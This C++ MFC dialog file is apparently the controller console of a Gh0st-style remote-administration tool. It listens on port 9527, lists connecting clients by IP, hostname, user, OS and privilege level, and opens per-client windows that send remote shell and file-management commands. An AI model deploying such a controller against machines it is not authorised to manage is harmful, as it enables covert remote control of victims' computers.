
// NinthServerDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "NinthServer.h"
#include "NinthServerDlg.h"
#include "afxdialogex.h"
#include "ClientDlg.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#endif
CIOCPServer* CNinthServerDlg::m_iocpServer = NULL;

// CNinthServerDlg �Ի���
typedef struct
{
	CString	title;
	double		nWidth;
}COLUMNSTRUCT;
COLUMNSTRUCT m_Column_Data[] = 
{
	{_T("Wan"),					0.15		},
	{_T("Lan"),					0.15		},
	{_T("Hostname"),			0.15		},
	{_T("User"),				0.1		},
	{_T("Version"),				0.25		},
	{_T("Privilege"),			0.19	},
};



CNinthServerDlg::CNinthServerDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CNinthServerDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CNinthServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, m_listCtrl);
}

BEGIN_MESSAGE_MAP(CNinthServerDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_WM_CONTEXTMENU()
	ON_COMMAND(ID_LIST_MANAGER, &CNinthServerDlg::OnListManager)
END_MESSAGE_MAP()


// CNinthServerDlg ��Ϣ�������

BOOL CNinthServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO: �ڴ���Ӷ���ĳ�ʼ������
	m_clientMap.clear();
	m_Column_Count	=	6;
	InitListCtrl();
	StartIOCPServer();
	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CNinthServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CNinthServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CNinthServerDlg::InitListCtrl()
{
	DWORD dwStyle = m_listCtrl.GetExtendedStyle();
	dwStyle |= LVS_EX_FULLROWSELECT;//ѡ��ĳ��ʹ���и�����ֻ������report����listctrl��
	dwStyle |= LVS_EX_GRIDLINES;//�����ߣ�ֻ������report����listctrl��
	m_listCtrl.SetExtendedStyle(dwStyle); //������չ���

	CRect rect;
	this->GetClientRect(&rect);
	int width = rect.Width();
	for (int i=0;i<m_Column_Count;i++)
	{
		m_listCtrl.InsertColumn(i,m_Column_Data[i].title,LVCFMT_LEFT,(int)(width*m_Column_Data[i].nWidth));
	}
}

void CNinthServerDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);
	//////////////////////////////////////////////////////////////////////////
	// move list ctrl
	//////////////////////////////////////////////////////////////////////////
	if (NULL == m_listCtrl)
	{
		return;
	}
	CRect rect;
	this->GetClientRect(&rect);
	m_listCtrl.MoveWindow(rect);

	int width = rect.Width();

	for (int i=0;i<m_Column_Count;i++)
	{
		m_listCtrl.SetColumnWidth(i,(int)(width*m_Column_Data[i].nWidth));
	}
	// TODO: �ڴ˴������Ϣ����������
}


void CNinthServerDlg::OnContextMenu(CWnd* /*pWnd*/, CPoint /*point*/)
{
	// TODO: �ڴ˴������Ϣ����������
 	if (m_listCtrl.GetSelectedCount() <= 0)
	{
		return;
	}
	//�������δ���, ��������Ӧ��ListCtrl
	CMenu menu, *pPopup;
	menu.LoadMenu(IDR_LIST_MENU);
	pPopup = menu.GetSubMenu(0);
	CPoint myPoint;
	ClientToScreen(&myPoint);
	GetCursorPos(&myPoint); //���λ��
	pPopup->TrackPopupMenu(TPM_LEFTALIGN|TPM_RIGHTBUTTON, myPoint.x, myPoint.y,this);

}

void CNinthServerDlg::StartIOCPServer()
{
	m_iocpServer = new CIOCPServer;
	m_iocpServer->Initialize(NotifyProc,this,10000,9527);
}
void CALLBACK CNinthServerDlg::NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode)
{
	try
	{
		CNinthServerDlg* pThis = (CNinthServerDlg*) lpParam;
		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			pThis->OnDisconnect(pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			pThis->ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			pThis->ProcessReceiveComplete(pContext);
			break;
		}
	}catch(...){}
}
void CNinthServerDlg::OnListManager()
{
	int nItemCount =  m_listCtrl.GetNextItem(-1,LVIS_SELECTED);
	DWORD dwClientContext = m_listCtrl.GetItemData(nItemCount);

	CString title;
	title = _T("Client: ");
	title += m_listCtrl.GetItemText(nItemCount,0);
	title += _T(" HostName: ") + m_listCtrl.GetItemText(nItemCount,2);
	CClientDlg * pClientDlg = new CClientDlg;
	pClientDlg->Create(IDD_CLIENTDLG, GetDesktopWindow());
	pClientDlg->SetWindowText(title);

	ClientContext* client = (ClientContext*)dwClientContext;

	m_clientMap.insert(make_pair(client->m_ID,pClientDlg));

	pClientDlg->SetIOCPServerAndContext(m_iocpServer,dwClientContext);
	pClientDlg->SendCmdCommand();
	pClientDlg->SendFileCommand();
	pClientDlg->ShowWindow(TRUE);
	// TODO: �ڴ���������������
}

void CNinthServerDlg::ProcessReceive(ClientContext *pContext)
{
	return;
}
void CNinthServerDlg::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;
	HEADER *pData = (HEADER *)pContext->m_DeCompressionBuffer.GetBuffer();
	switch(pData->flag)
	{
	case CLIENT_LOGIN:
		{
			if (m_iocpServer->m_nMaxConnections <= m_listCtrl.GetItemCount())
			{
				closesocket(pContext->m_Socket);
			}
			else
			{
				pContext->m_bIsMainSocket = true;
				pContext->m_ID	= pData->ID;
				AddToList(pContext);
			}
			// ����
			BYTE	bToken = SERVER_ACTIVED;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
			return;
		}
		break;
	}
	CClientDlg* pDlg = NULL;
	ClientMap::iterator it = m_clientMap.find(pData->ID);
	if (it	!= m_clientMap.end())
	{
		pDlg = it->second;
	}
	pDlg->OnReceiveComplete(pContext);
	return;
}
void CNinthServerDlg::OnDisconnect(ClientContext* pContext)
{
	if (pContext == NULL)
		return ;
	// ɾ����������п��ܻ�ɾ��Context
	try
	{
		int nCnt = m_listCtrl.GetItemCount();
		for (int i=0; i < nCnt; i++)
		{
			if (pContext == (ClientContext *)m_listCtrl.GetItemData(i))
			{
				m_listCtrl.DeleteItem(i);
				break;
			}		
		}
		// �ر���ش���
	}catch(...){}

	return;
}

int CNinthServerDlg::AddToList(ClientContext* pContext)
{
	LOGIN*	LoginInfo;
	if (pContext == NULL)
		return FALSE;
	CString	strToolTipsText, strOS;
	try
	{
		int nCnt = m_listCtrl.GetItemCount();
		// ���Ϸ������ݰ�
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGIN))
			return -1;
		LoginInfo = (LOGIN*)pContext->m_DeCompressionBuffer.GetBuffer();
		//////////////////////////////////////////////////////////////////////////
		//  Ip  wan/lan ��ʾ
		// ����IP
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);

		CString IPAddress;
		if (INVALID_SOCKET != bResult)
			IPAddress = inet_ntoa(sockAddr.sin_addr); 
		else
			IPAddress = _T("");
		int i = m_listCtrl.InsertItem(nCnt, IPAddress);
		//////////////////////////////////////////////////////////////////////////
		// ����IP
		CString LanIPstr;
		LanIPstr = inet_ntoa((LoginInfo->IPAddress));
		m_listCtrl.SetItemText(i, 1, LanIPstr);
		//////////////////////////////////////////////////////////////////////////
		// ������
		CString HostNameStr;
		HostNameStr = LoginInfo->HostName;
		m_listCtrl.SetItemText(i, 2, HostNameStr);
		//////////////////////////////////////////////////////////////////////////
		// �û���
		CString UserNameStr;
		UserNameStr = LoginInfo->UserName;
		m_listCtrl.SetItemText(i, 3, UserNameStr);
		//////////////////////////////////////////////////////////////////////////
		// ϵͳ
		// ��ʾ�����Ϣ
		CString pszOS;
		if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
			pszOS = "NT";
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			pszOS = "Windows 2000";
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			pszOS = "Windows XP";
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 && (LoginInfo->OsVerInfoEx.wSuiteMask & VER_SUITE_WH_SERVER))
			pszOS = "Windows Home Server ";
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
			pszOS = "Windows Vista";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
			pszOS = "Windows Server 2008";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
			pszOS = "Windows 7";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
			pszOS = "Windows Server 2008 R2";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
			pszOS = "Windows 8";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
			pszOS = "Windows Server 2012";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 3 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
			pszOS = "Windows 8.1";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 3 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
			pszOS = "Windows Server 2012 R2";
		else
		{pszOS = "unknown";}

		strOS.Format(
			_T("%s SP%d (Build %d)"),
			//OsVerInfo.szCSDVersion,
			pszOS, 
			LoginInfo->OsVerInfoEx.wServicePackMajor, 
			LoginInfo->OsVerInfoEx.dwBuildNumber);
		m_listCtrl.SetItemText(i, 4, strOS);
		switch(LoginInfo->Privilege)
		{
		case USER_PRIV_GUEST:
			m_listCtrl.SetItemText (i,5,_T("Guest")); 
			break;
		case USER_PRIV_USER:
			m_listCtrl.SetItemText (i,5,_T("User")); 
			break;
		case USER_PRIV_ADMIN:
			m_listCtrl.SetItemText (i,5,_T("Administrator")); 
			break;
		default:
			m_listCtrl.SetItemText (i,5,_T("UnKnown")); 
			
			break;
		}
		// ָ��Ψһ��ʶ
		m_listCtrl.SetItemData(i, (DWORD) pContext);
	}catch(...){}

	return 0;
}